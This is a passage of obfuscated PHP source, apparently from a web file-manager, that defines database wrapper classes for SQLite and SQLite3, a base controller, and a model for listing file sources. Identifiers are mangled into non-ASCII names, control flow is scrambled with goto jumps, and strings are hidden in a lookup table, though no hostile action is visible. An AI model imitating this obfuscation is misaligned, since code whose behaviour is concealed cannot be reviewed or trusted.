$this->cacheSet($eê»¾½«ª¦, $Bõò¡àÅª¯); $Bõò¡àÅª¯ = array_merge($aßÚ©Ğ”Â´, $Bõò¡àÅª¯); return $b‰ÈÈµªã¾ ? $Bõò¡àÅª¯[$b‰ÈÈµªã¾] : $Bõò¡àÅª¯; goto C‡Ÿ³‹’óÒ; C‡Ÿ³‹’óÒ: } public function set($c‚©ÀÀ…Û, $bìâãÓ¡æŠ = false, $f»¦­‹ª„ê = '') { goto F­É¼Å¯å; Fè°¤ÕÊˆ™: return $this->addAll($DÜ¶•¤š·, array(), !0); goto bÂëŠ°Æ¾Ì; F­É¼Å¯å: $b‡ÎÛÇ×ë¥ =& $_SERVER[Ìó]; $this->cacheRemove($f»¦­‹ª„ê); $DÜ¶•¤š· = array(); goto CĞ¸‹öª; CĞ¸‹öª: $F‡‰ë’ÌËÑ = is_array($c‚©ÀÀ…Û) ? $c‚©ÀÀ…Û : array($c‚©ÀÀ…Û => $bìâãÓ¡æŠ); foreach ($F‡‰ë’ÌËÑ as $bäˆëŒ¾¯ => $dßÎƒÃŠ·) { if (is_array($dßÎƒÃŠ·)) { $dßÎƒÃŠ· = json_encode_force($dßÎƒÃŠ·); } $this->checkLength($dßÎƒÃŠ·, !1, $this->tableName . $b‡ÎÛÇ×ë¥[4] . $c‚©ÀÀ…Û); $dßÎƒÃŠ· = self::textEncode($dßÎƒÃŠ·); $F‡‰ë’ÌËÑ = array($b‡ÎÛÇ×ë¥[29] => $f»¦­‹ª„ê, $b‡ÎÛÇ×ë¥[89] => $bäˆëŒ¾¯, $b‡ÎÛÇ×ë¥[355] => $dßÎƒÃŠ·); $DÜ¶•¤š·[] = $this->filterWhere($F‡‰ë’ÌËÑ); } if (!$DÜ¶•¤š·) { return !0; } goto Fè°¤ÕÊˆ™; bÂëŠ°Æ¾Ì: } protected function optionDefault($eÆ¤¤¡…Ÿ´ = '') { return !1; } public function setDeep($d¤å§ÅƒºŞ, $f£š¸Ù‚¬É = false, $d…Ó…Š«²Ü = '') { $a‡Ÿ­Œ±õ = explode($_SERVER[Ìó][91], $d¤å§ÅƒºŞ); $cëĞ©Ú‡¾› = $this->get(); array_set_value($cëĞ©Ú‡¾›, $d¤å§ÅƒºŞ, $f£š¸Ù‚¬É); $this->set($a‡Ÿ­Œ±õ[0], $cëĞ©Ú‡¾›[$a‡Ÿ­Œ±õ[0]], $d…Ó…Š«²Ü); } public function remove($cæ§›¾ÎùÎ, $Eà†Å¶‰ö¢ = '') { $eòôÂ¥‰Šİ =& $_SERVER[Ìó]; $this->cacheRemove($Eà†Å¶‰ö¢); $A›¦²À¹¿é = $this->filterWhere(array($eòôÂ¥‰Šİ[89] => $cæ§›¾ÎùÎ, $eòôÂ¥‰Šİ[29] => $Eà†Å¶‰ö¢)); if (is_null($cæ§›¾ÎùÎ)) { unset($A›¦²À¹¿é[$eòôÂ¥‰Šİ[89]]); } return $this->where($A›¦²À¹¿é)->delete(); } public function cacheSet($Aùñ’óƒè, $Cƒ‚©Öï³¿ = false) { return Cache::set($this->cacheKey($Aùñ’óƒè), $Cƒ‚©Öï³¿); } public function cacheGet($dš‚¢ñ‘£) { return Cache::get($this->cacheKey($dš‚¢ñ‘£)); } public function cacheRemove($DÀÎôƒÀ÷Æ) { return Cache::remove($this->cacheKey($DÀÎôƒÀ÷Æ)); } protected function filterWhere($B»âïÎŒå„) { return $B»âïÎŒå„; } protected function cacheKey($dİ´×¸ Ñ) { return $dİ´×¸ Ñ; } } goto cäïÎÂîŒ“; FÈ±§«„—†: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto CÚ¾¦êÜæ; F¯ÊåŒ¼ì: $this->in =& $in; $this->values[$B¿‰Á˜ò‘[6]] =& $config; $this->values[$B¿‰Á˜ò‘[7]] =& $in; goto fÕÏŞßÖœÙ; fÕÏŞßÖœÙ: $this->tpl = TEMPLATE . MOD . $B¿‰Á˜ò‘[8]; $this->_classObjectID = mt_rand(0, 10000); goto D…¥£‘õîÊ; CÚ¾¦êÜæ: $B¿‰Á˜ò‘ =& $_SERVER[Ìó]; global $in, $config; $this->config =& $config; goto F¯ÊåŒ¼ì; D…¥£‘õîÊ: } public function loadClass($f÷Ô“ÕáÚ) { if (1 === func_num_args()) { $this->{$f÷Ô“ÕáÚ} = new $f÷Ô“ÕáÚ(); } else { $b™–»Õ¡Ş = new ReflectionClass($f÷Ô“ÕáÚ); $Aè‰×–ëŒâ = func_get_args(); array_shift($Aè‰×–ëŒâ); $this->{$f÷Ô“ÕáÚ} = $b™–»Õ¡Ş->newInstanceArgs($Aè‰×–ëŒâ); } return $this->{$f÷Ô“ÕáÚ}; } protected function assign($Cæãö£¸‹, $a‡‹ãª‰å²) { $this->values[$Cæãö£¸‹] = $a‡‹ãª‰å²; } protected function display($d´»ˆµÅéŠ) { ob_end_clean(); extract($this->values); require $this->tpl . $d´»ˆµÅéŠ; } } class DbSqliteBase extends Db { public function __construct($B±¢ˆÌ¨º– = '') { $EÛ‰´êù™ =& $_SERVER[Ìó]; if (!extension_loaded($EÛ‰´êù™[9])) { think_exception(think_lang($EÛ‰´êù™[10]) . $EÛ‰´êù™[11]); } if (!empty($B±¢ˆÌ¨º–)) { if (!isset($B±¢ˆÌ¨º–[$EÛ‰´êù™[12]])) { $B±¢ˆÌ¨º–[$EÛ‰´êù™[12]] = 438; } $this->config = $B±¢ˆÌ¨º–; if (empty($this->config[$EÛ‰´êù™[13]])) { $this->config[$EÛ‰´êù™[13]] = array(); } } } public function connect($FÍ¹Æœ·Øõ = '', $B²ù­×—† = 0) { $bÍù¥ÓÙÀ† =& $_SERVER[Ìó]; if (!isset($this->linkID[$B²ù­×—†])) { goto fù˜º¸•……; CÂŠÕ®‡Ñ: @sqlite_busy_timeout($this->linkID[$B²ù­×—†], 30000); if (1 != think_config($bÍù¥ÓÙÀ†[18])) { unset($this->config); } goto bí¯“Ù±»; fù˜º¸•……: if (empty($FÍ¹Æœ·Øõ)) { $FÍ¹Æœ·Øõ = $this->config; } $fÆÎ¼÷âğŠ = !empty($FÍ¹Æœ·Øõ[$bÍù¥ÓÙÀ†[13]][$bÍù¥ÓÙÀ†[14]]) ? $FÍ¹Æœ·Øõ[$bÍù¥ÓÙÀ†[13]][$bÍù¥ÓÙÀ†[14]] : $this->pconnect; $f©ì¬µâÀ = $fÆÎ¼÷âğŠ ? $bÍù¥ÓÙÀ†[15] : $bÍù¥ÓÙÀ†[16]; goto b„„˜‡§¶; b„„˜‡§¶: $this->linkID[$B²ù­×—†] = $f©ì¬µâÀ($FÍ¹Æœ·Øõ[$bÍù¥ÓÙÀ†[17]], $FÍ¹Æœ·Øõ[$bÍù¥ÓÙÀ†[12]]); if (!$this->linkID[$B²ù­×—†]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto CÂŠÕ®‡Ñ; bí¯“Ù±»: } return $this->linkID[$B²ù­×—†]; } public function free() { $this->queryID = null; } public function query($B§äù¯÷ìÃ) { goto cœ¸Å†éå÷; BÕéíÙÒÅ‹: think_status($cªšËéàèÎ[20]); $this->queryID = sqlite_query($this->_linkID, $B§äù¯÷ìÃ); $this->debug(); goto f˜İµ†ì÷; cœ¸Å†éå÷: $cªšËéàèÎ =& $_SERVER[Ìó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E¿±ÆŠˆùË; E¿±ÆŠˆùË: $this->queryStr = $B§äù¯÷ìÃ; if ($this->queryID) { $this->free(); } think_action_status($cªšËéàèÎ[19], 1); goto BÕéíÙÒÅ‹; f˜İµ†ì÷: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $EÀ‹”†Óİ§ = $this->getAll(); return $EÀ‹”†Óİ§; } goto aî¯İ±ÆÀÅ; aî¯İ±ÆÀÅ: } public function execute($eÜ¬ÌÁ¿ã•) { goto d£ØÁöÇ; Eáš¿À±¼¥: if (!1 === $AíàÓîÁöˆ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto c„ãîñ¾õ; d£ØÁöÇ: $dß¸Í›ˆÈñ =& $_SERVER[Ìó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bì©Çæğ¬È; DŒ¾¤ïÍ‰â: think_status($dß¸Í›ˆÈñ[20]); $AíàÓîÁöˆ = sqlite_exec($this->_linkID, $eÜ¬ÌÁ¿ã•); $this->debug(); goto Eáš¿À±¼¥; bì©Çæğ¬È: $this->queryStr = $eÜ¬ÌÁ¿ã•; if ($this->queryID) { $this->free(); } think_action_status($dß¸Í›ˆÈñ[21], 1); goto DŒ¾¤ïÍ‰â; c„ãîñ¾õ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ìó][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cåùÑÇÌĞÄ = sqlite_query($this->_linkID, $_SERVER[Ìó][23]); if (!$cåùÑÇÌĞÄ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $F„íè”ÌË = sqlite_query($this->_linkID, $_SERVER[Ìó][24]); if (!$F„íè”ÌË) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $dŸğàÙÏíÂ = array(); if ($this->numRows > 0) { for ($BÍÆ˜¡Ï¯É = 0; $BÍÆ˜¡Ï¯É < $this->numRows; $BÍÆ˜¡Ï¯É++) { $dŸğàÙÏíÂ[$BÍÆ˜¡Ï¯É] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $dŸğàÙÏíÂ; } public function getFields($F°œÑ¬‘³î) { $EÄ¡…©Ç±‘ =& $_SERVER[Ìó]; $báÁ‡‚› = $this->query($EÄ¡…©Ç±‘[25] . $F°œÑ¬‘³î . $EÄ¡…©Ç±‘[26]); $cÅ£•»†ƒŸ = array(); if ($báÁ‡‚›) { foreach ($báÁ‡‚› as $aÑ¸“Ô—ëì => $A´ß©¹‰É­) { $cÅ£•»†ƒŸ[$A´ß©¹‰É­[$EÄ¡…©Ç±‘[27]]] = array($EÄ¡…©Ç±‘[28] => $A´ß©¹‰É­[$EÄ¡…©Ç±‘[27]], $EÄ¡…©Ç±‘[29] => $A´ß©¹‰É­[$EÄ¡…©Ç±‘[30]], $EÄ¡…©Ç±‘[31] => (bool) ($A´ß©¹‰É­[$EÄ¡…©Ç±‘[32]] === $EÄ¡…©Ç±‘[33]), $EÄ¡…©Ç±‘[34] => $A´ß©¹‰É­[$EÄ¡…©Ç±‘[35]], $EÄ¡…©Ç±‘[36] => strtolower($A´ß©¹‰É­[$EÄ¡…©Ç±‘[37]]) == $EÄ¡…©Ç±‘[38], $EÄ¡…©Ç±‘[39] => strtolower($A´ß©¹‰É­[$EÄ¡…©Ç±‘[40]]) == $EÄ¡…©Ç±‘[41]); } } return $cÅ£•»†ƒŸ; } public function getTables($F¢Æé‰ªŠÁ = '') { $bŒõŒÇÎà£ =& $_SERVER[Ìó]; $dİ‰îİ˜¼Å = $this->query($bŒõŒÇÎà£[42] . $bŒõŒÇÎà£[43] . $bŒõŒÇÎà£[44]); $cÔ‡¿‹ö·á = array(); foreach ($dİ‰îİ˜¼Å as $A¬Ë“Èòï˜ => $dŠ®ˆº‹”‘) { $cÔ‡¿‹ö·á[$A¬Ë“Èòï˜] = current($dŠ®ˆº‹”‘); } return $cÔ‡¿‹ö·á; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $d´‰½¹ğŸ =& $_SERVER[Ìó]; $fÖ¢éÛë™– = sqlite_last_error($this->_linkID); $this->error = $fÖ¢éÛë™– . $d´‰½¹ğŸ[4] . sqlite_error_string($fÖ¢éÛë™–); if ($d´‰½¹ğŸ[33] != $this->queryStr) { $this->error .= LNG($d´‰½¹ğŸ[45]) . $this->queryStr; } think_trace($this->error, $d´‰½¹ğŸ[33], $d´‰½¹ğŸ[46]); return $this->error; } public function escapeString($AŒîù‹•õ¨) { return sqlite_escape_string($AŒîù‹•õ¨); } public function parseLimit($e…³Œ×ˆ) { $AØ‰ÅàÕßí =& $_SERVER[Ìó]; $d©ÃÓ–åƒÇ = $AØ‰ÅàÕßí[33]; if (!empty($e…³Œ×ˆ)) { $e…³Œ×ˆ = explode($AØ‰ÅàÕßí[47], $e…³Œ×ˆ); if (count($e…³Œ×ˆ) > 1) { $d©ÃÓ–åƒÇ .= $AØ‰ÅàÕßí[48] . $e…³Œ×ˆ[1] . $AØ‰ÅàÕßí[49] . $e…³Œ×ˆ[0] . $AØ‰ÅàÕßí[50]; } else { $d©ÃÓ–åƒÇ .= $AØ‰ÅàÕßí[48] . $e…³Œ×ˆ[0] . $AØ‰ÅàÕßí[50]; } } return $d©ÃÓ–åƒÇ; } } class DbSqlite3Base extends Db { public function __construct($D°ª¹ã›ãÔ = '') { $Bôƒ“µçÙ² =& $_SERVER[Ìó]; if (!class_exists($Bôƒ“µçÙ²[51])) { think_exception(think_lang($Bôƒ“µçÙ²[10]) . $Bôƒ“µçÙ²[52]); } if (!empty($D°ª¹ã›ãÔ)) { if (!isset($D°ª¹ã›ãÔ[$Bôƒ“µçÙ²[12]])) { $D°ª¹ã›ãÔ[$Bôƒ“µçÙ²[12]] = 438; } $this->config = $D°ª¹ã›ãÔ; if (empty($this->config[$Bôƒ“µçÙ²[13]])) { $this->config[$Bôƒ“µçÙ²[13]] = array(); } } } public function connect($dªä˜ˆİè‘ = '', $EëÎÃ¦ğ›ß = 0) { $eçî¼­ÛÖ =& $_SERVER[Ìó]; if (!isset($this->linkID[$EëÎÃ¦ğ›ß])) { if (empty($dªä˜ˆİè‘)) { $dªä˜ˆİè‘ = $this->config; } $this->linkID[$EëÎÃ¦ğ›ß] = new SQLite3($dªä˜ˆİè‘[$eçî¼­ÛÖ[17]]); if (!$this->linkID[$EëÎÃ¦ğ›ß]) { think_exception($this->linkID[$EëÎÃ¦ğ›ß]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$EëÎÃ¦ğ›ß]->busyTimeout(30000); if (1 != think_config($eçî¼­ÛÖ[18])) { unset($this->config); } } return $this->linkID[$EëÎÃ¦ğ›ß]; } public function free() { $this->queryID = null; } public function query($b¤ÇÕ„­ç) { goto d‰ˆˆÑÁÖ‰; d£ÍŠÉÀ›©: if (!1 === $this->queryID) { $this->error(); return !1; } else { $CÉÕ’çîÎ† = $this->getAll(); $this->numRows = count($CÉÕ’çîÎ†); return $CÉÕ’çîÎ†; } goto dµä¥¾¥Ü; FøŒ‘–¾›¡: think_status($cÅ¹ö¢Õ‡[20]); $this->queryID = $this->_linkID->query($b¤ÇÕ„­ç); $this->debug(); goto d£ÍŠÉÀ›©; BÚ­øî®Á: $this->queryStr = $b¤ÇÕ„­ç; if ($this->queryID) { $this->free(); } think_action_status($cÅ¹ö¢Õ‡[19], 1); goto FøŒ‘–¾›¡; d‰ˆˆÑÁÖ‰: $cÅ¹ö¢Õ‡ =& $_SERVER[Ìó]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto BÚ­øî®Á; dµä¥¾¥Ü: } public function execute($bá½¥ôšÄÖ) { goto fÛ´Â´Š×ï; b¹²¨É¤ŸÊ: $this->queryStr = $bá½¥ôšÄÖ; if ($this->queryID) { $this->free(); } think_action_status($a¹Ì¡ÉšÆ‹[21], 1); goto A‰‰£ñ˜¬„; A‰‰£ñ˜¬„: think_status($a¹Ì¡ÉšÆ‹[20]); $cªÀñáÁåë = $this->_linkID->exec($bá½¥ôšÄÖ); $this->debug(); goto FêÎ¨ÂØØæ; FêÎ¨ÂØØæ: if (!1 === $cªÀñáÁåë) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto f…ŠöÛ ®; fÛ´Â´Š×ï: $a¹Ì¡ÉšÆ‹ =& $_SERVER[Ìó]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b¹²¨É¤ŸÊ; f…ŠöÛ ®: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ìó][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $AÛŠğÅ‰¾™ = $this->_linkID->query($_SERVER[Ìó][23]); if (!$AÛŠğÅ‰¾™) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $B˜˜÷ŸëºÜ = $this->_linkID->query($_SERVER[Ìó][24]); if (!$B˜˜÷ŸëºÜ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B†æ’†ê = array(); while ($E…ñÑÎº¡ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $B†æ’†ê[] = $E…ñÑÎº¡; } $this->queryID->reset(); return $B†æ’†ê; } public function getFields($c¬¦ÆªâŒÒ) { $EìÅ£Öƒ²Í =& $_SERVER[Ìó]; $bØÔˆòÌª = $this->query($EìÅ£Öƒ²Í[25] . $c¬¦ÆªâŒÒ . $EìÅ£Öƒ²Í[26]); $BÂï«Ã©š = array(); if ($bØÔˆòÌª) { foreach ($bØÔˆòÌª as $CÛåæÃ”–¶ => $DƒõãÁ‡…») { $BÂï«Ã©š[$DƒõãÁ‡…»[$EìÅ£Öƒ²Í[28]]] = array($EìÅ£Öƒ²Í[28] => $DƒõãÁ‡…»[$EìÅ£Öƒ²Í[28]], $EìÅ£Öƒ²Í[29] => $DƒõãÁ‡…»[$EìÅ£Öƒ²Í[29]], $EìÅ£Öƒ²Í[31] => (bool) ($DƒõãÁ‡…»[$EìÅ£Öƒ²Í[31]] === $EìÅ£Öƒ²Í[33]), $EìÅ£Öƒ²Í[34] => $DƒõãÁ‡…»[$EìÅ£Öƒ²Í[53]], $EìÅ£Öƒ²Í[36] => (bool) $DƒõãÁ‡…»[$EìÅ£Öƒ²Í[54]], $EìÅ£Öƒ²Í[39] => (bool) $DƒõãÁ‡…»[$EìÅ£Öƒ²Í[54]]); } } return $BÂï«Ã©š; } public function getTables($Bø‹Ó À¡Ó = '') { $aˆÁºÁĞ· =& $_SERVER[Ìó]; $C„ø‡©«¾ç = $this->query($aˆÁºÁĞ·[42] . $aˆÁºÁĞ·[43] . $aˆÁºÁĞ·[44]); $C·õ–Ü„éŒ = array(); foreach ($C„ø‡©«¾ç as $F‚À¸Ó¾”µ => $a·­†¤Ó¹¾) { $C·õ–Ü„éŒ[$F‚À¸Ó¾”µ] = current($a·­†¤Ó¹¾); } return $C·õ–Ü„éŒ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $b§»«‡¹šÌ =& $_SERVER[Ìó]; $this->error = $this->_linkID->lastErrorMsg(); if ($b§»«‡¹šÌ[33] != $this->queryStr) { $this->error .= LNG($b§»«‡¹šÌ[45]) . $this->queryStr; } think_trace($this->error, $b§»«‡¹šÌ[33], $b§»«‡¹šÌ[46]); return $this->error; } public function escapeString($BŸ³åĞ³¿Ø) { $Cë£Â«ƒäª =& $_SERVER[Ìó]; if ($this->_linkID) { return $this->_linkID->escapeString($BŸ³åĞ³¿Ø); } return str_ireplace($Cë£Â«ƒäª[55], $Cë£Â«ƒäª[56], $BŸ³åĞ³¿Ø); } public function parseLimit($Eº¿¬™¨±­) { $F³½óË‰é =& $_SERVER[Ìó]; $FÖ¶ğìÜÁ‡ = $F³½óË‰é[33]; if (!empty($Eº¿¬™¨±­)) { $Eº¿¬™¨±­ = explode($F³½óË‰é[47], $Eº¿¬™¨±­); if (count($Eº¿¬™¨±­) > 1) { $FÖ¶ğìÜÁ‡ .= $F³½óË‰é[48] . $Eº¿¬™¨±­[1] . $F³½óË‰é[49] . $Eº¿¬™¨±­[0] . $F³½óË‰é[50]; } else { $FÖ¶ğìÜÁ‡ .= $F³½óË‰é[48] . $Eº¿¬™¨±­[0] . $F³½óË‰é[50]; } } return $FÖ¶ğìÜÁ‡; } } goto f®ê×ÚáŠ¹; A§ÛÌÎ¢Ë‹: define($_SERVER[Ìó][1904], 5); define($_SERVER[Ìó][1905], 16); define($_SERVER[Ìó][1906], 32); goto aä†ëŒÏ¬; cäïÎÂîŒ“: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\x72\x63\x65"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\x6d\145" => "\151\157\x5f\163\157\165\x72\143\x65\x5f\x6d\145\x74\x61", "\x6d\145\x74\141\106\x69\x65\154\144" => "\x73\x6f\165\x72\x63\145\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\x69\x6d\x65", "\x74\151\x6d\145", "\x69\156\163\x65\x72\x74", "\146\165\156\x63\164\x69\x6f\156"), array("\x63\162\145\141\x74\x65\124\151\x6d\145", "\x74\x69\x6d\145", "\151\x6e\x73\x65\162\x74", "\x66\165\x6e\143\164\151\x6f\156"), array("\x76\x69\145\x77\124\151\x6d\x65", "\x74\151\155\145", "\151\156\x73\145\162\164", "\x66\x75\156\143\164\151\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Bï™£§Ÿ‹ƒ) { return $this->listSource(array($_SERVER[Ìó][364] => $Bï™£§Ÿ‹ƒ)); } public function typeName($bÎ‹Ø°à‹‡) { static $D¤¾öÌŒŒ³ = array(self::TYPE_SYSTEM => "\x73\171\x73\164\x65\x6d", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\147\162\x6f\x75\160"); return $D¤¾öÌŒŒ³[$bÎ‹Ø°à‹‡ . $_SERVER[Ìó][33]]; } public function sourceListInfo($dåôÁ´¿Î¹, $aƒÙÎ‚»£ï = false) { goto bœÎª”Ã“¯; d´¡æ‹‰•ª: return array_to_keyvalue($e±İ–‰®¼’, $Fâ‹’¥„Å[365]); goto AĞ‡ˆï‡š; BÑàÆ†ÎÇ: if (!$dåôÁ´¿Î¹) { return array(); } $e±İ–‰®¼’ = $this->where(array($Fâ‹’¥„Å[365] => array($Fâ‹’¥„Å[7], $dåôÁ´¿Î¹)))->select(); $this->_listDataApply($e±İ–‰®¼’, $aƒÙÎ‚»£ï); goto d´¡æ‹‰•ª; bœÎª”Ã“¯: $Fâ‹’¥„Å =& $_SERVER[Ìó]; $dåôÁ´¿Î¹ = $dåôÁ´¿Î¹ ? $dåôÁ´¿Î¹ : array(); $dåôÁ´¿Î¹ = array_filter(array_unique($dåôÁ´¿Î¹)); goto BÑàÆ†ÎÇ; AĞ‡ˆï‡š: } public function pathInfoFilter($E¢Ö…°ƒÄ) { goto dÌËÌù¶; Aİôí¸—Î‹: if (isset($E¢Ö…°ƒÄ[$bòÔ­º•[372]]) && $E¢Ö…°ƒÄ[$bòÔ­º•[372]][$bòÔ­º•[373]] == -1) { $AºçÇ©Šô“ = array_remove_value($AºçÇ©Šô“, $bòÔ­º•[183]); $AºçÇ©Šô“ = array_remove_value($AºçÇ©Šô“, $bòÔ­º•[106]); $AºçÇ©Šô“ = array_remove_value($AºçÇ©Šô“, $bòÔ­º•[374]); $AºçÇ©Šô“ = array_remove_value($AºçÇ©Šô“, $bòÔ­º•[375]); $AºçÇ©Šô“ = array_remove_value($AºçÇ©Šô“, $bòÔ­º•[77]); $AºçÇ©Šô“ = array_remove_value($AºçÇ©Šô“, $bòÔ­º•[376]); } $E¢Ö…°ƒÄ = array_field_key($E¢Ö…°ƒÄ, $AºçÇ©Šô“); return $E¢Ö…°ƒÄ; goto B„Òğç¼…; c«†”µ½Ä: $E¢Ö…°ƒÄ[$bòÔ­º•[367]] = $this->typeName($E¢Ö…°ƒÄ[$bòÔ­º•[367]]); if ($E¢Ö…°ƒÄ[$bòÔ­º•[366]] != 1) { $E¢Ö…°ƒÄ[$bòÔ­º•[156]] = $E¢Ö…°ƒÄ[$bòÔ­º•[368]]; unset($E¢Ö…°ƒÄ[$bòÔ­º•[368]]); } $bËãƒ›Ì® = $bòÔ­º•[369]; goto Eôƒ‡‰â; Eôƒ‡‰â: $bËãƒ›Ì® .= $bòÔ­º•[370]; $bËãƒ›Ì® .= $bòÔ­º•[371]; $AºçÇ©Šô“ = explode($bòÔ­º•[47], $bËãƒ›Ì®); goto Aİôí¸—Î‹; dÌËÌù¶: $bòÔ­º• =& $_SERVER[Ìó]; $E¢Ö…°ƒÄ[$bòÔ­º•[75]] = KodIO::make($E¢Ö…°ƒÄ[$bòÔ­º•[365]]); $E¢Ö…°ƒÄ[$bòÔ­º•[29]] = $E¢Ö…°ƒÄ[$bòÔ­º•[366]] == 1 ? $bòÔ­º•[76] : $bòÔ­º•[163]; goto c«†”µ½Ä; B„Òğç¼…: } public function listUserFav() { goto Fí›íÅ’Çø; Fí›íÅ’Çø: $A³ÒºÓÍÎò =& $_SERVER[Ìó]; $B÷ÂÌøËè = Model($A³ÒºÓÍÎò[377])->listData(); $FËùõ¼ªø = array_filter_by_field($B÷ÂÌøËè, $A³ÒºÓÍÎò[29], $A³ÒºÓÍÎò[378]); goto FÉŒ•¯§Ä; dğ‰òçŞ: foreach ($B÷ÂÌøËè as &$bã¡¦Ç†šŠ) { $bã¡¦Ç†šŠ = array($A³ÒºÓÍÎò[381] => $bã¡¦Ç†šŠ[$A³ÒºÓÍÎò[363]], $A³ÒºÓÍÎò[382] => $bã¡¦Ç†šŠ[$A³ÒºÓÍÎò[28]], $A³ÒºÓÍÎò[383] => $bã¡¦Ç†šŠ[$A³ÒºÓÍÎò[75]], $A³ÒºÓÍÎò[384] => $bã¡¦Ç†šŠ[$A³ÒºÓÍÎò[29]], $A³ÒºÓÍÎò[385] => $bã¡¦Ç†šŠ[$A³ÒºÓÍÎò[183]], $A³ÒºÓÍÎò[386] => $bã¡¦Ç†šŠ[$A³ÒºÓÍÎò[106]]); if ($bã¡¦Ç†šŠ[$A³ÒºÓÍÎò[29]] == $A³ÒºÓÍÎò[378] && $EÌù’ŠÅ³Õ[$bã¡¦Ç†šŠ[$A³ÒºÓÍÎò[75]]]) { $bã¡¦Ç†šŠ[$A³ÒºÓÍÎò[387]] = $EÌù’ŠÅ³Õ[$bã¡¦Ç†šŠ[$A³ÒºÓÍÎò[75]]]; } } return $B÷ÂÌøËè; goto b§²ÓÂš°„; FÉŒ•¯§Ä: $FËùõ¼ªø = array_to_keyvalue($FËùõ¼ªø, $A³ÒºÓÍÎò[33], $A³ÒºÓÍÎò[75]); if ($FËùõ¼ªø) { $EÌù’ŠÅ³Õ = $this->listSource(array($A³ÒºÓÍÎò[379] => array($A³ÒºÓÍÎò[380], $FËùõ¼ªø))); } $EÌù’ŠÅ³Õ = array_to_keyvalue($EÌù’ŠÅ³Õ[$A³ÒºÓÍÎò[350]], $A³ÒºÓÍÎò[365]); goto dğ‰òçŞ; b§²ÓÂš°„: } public function listUserTag($a¶“Ş¨º¥š) { goto f¿øÃ–‚¼; f’ÒÉö”³±: return $this->listSource($fç«‰âÌ‡å); goto Bê¡†Òì¦; EãÄíˆ¦Ù®: $b–ÀÒÎÌê× = array_to_keyvalue($b–ÀÒÎÌê×, $BŠ¥¤â÷¾[33], $BŠ¥¤â÷¾[75]); if (!$b–ÀÒÎÌê×) { return array(); } $fç«‰âÌ‡å = array($BŠ¥¤â÷¾[379] => array($BŠ¥¤â÷¾[380], $b–ÀÒÎÌê×)); goto f’ÒÉö”³±; f¿øÃ–‚¼: $BŠ¥¤â÷¾ =& $_SERVER[Ìó]; $d‚ª²¾Ìœô = Model($BŠ¥¤â÷¾[388])->listData(); $b–ÀÒÎÌê× = array_filter_by_field($d‚ª²¾Ìœô, $BŠ¥¤â÷¾[389], $a¶“Ş¨º¥š); goto EãÄíˆ¦Ù®; Bê¡†Òì¦: } public function listUserRecycle() { $böËÙ«âŠ¶ =& $_SERVER[Ìó]; $c·ÅÃî§”Ò = Model($böËÙ«âŠ¶[390])->listData(); if (!$c·ÅÃî§”Ò) { return array(); } $FÍôŒ¥´§ = array($böËÙ«âŠ¶[379] => array($böËÙ«âŠ¶[380], $c·ÅÃî§”Ò), $böËÙ«âŠ¶[391] => 1); return $this->listSource($FÍôŒ¥´§); } public function listSource($FåÔØŞò–, $døË´éÍ„ğ = 3000) { goto a¿áŠ›«ªÈ; a¿áŠ›«ªÈ: $E¶²—©º¤“ =& $_SERVER[Ìó]; if (!isset($FåÔØŞò–[$E¶²—©º¤“[392]])) { $FåÔØŞò–[$E¶²—©º¤“[392]] = 0; } $AŞİŒâ = $E¶²—©º¤“[393]; goto cìÖÀ×Â´á; C¶Ñ¢ÅŒŠ¶: return $A°ˆó‘•Î½; goto bƒ¨â¶¹ÆÃ; cìÖÀ×Â´á: $A°ˆó‘•Î½ = $this->field($AŞİŒâ)->_makeOrder()->where($FåÔØŞò–)->selectPage($døË´éÍ„ğ); $this->_listDataApply($A°ˆó‘•Î½[$E¶²—©º¤“[350]]); $this->_listMake($A°ˆó‘•Î½); goto C¶Ñ¢ÅŒŠ¶; bƒ¨â¶¹ÆÃ: } protected function _makeOrder() { goto eùîÊÑ‘‹˜; eÊ¯æë†ƒÑ: $dš´¤Šİ”± = array($d„†¿å’‹[397] => $d„†¿å’‹[398], $d„†¿å’‹[399] => $d„†¿å’‹[400]); $FŞ®ë¦Â = array($d„†¿å’‹[28] => $d„†¿å’‹[28], $d„†¿å’‹[77] => $d„†¿å’‹[77], $d„†¿å’‹[156] => $d„†¿å’‹[368], $d„†¿å’‹[374] => $d„†¿å’‹[374], 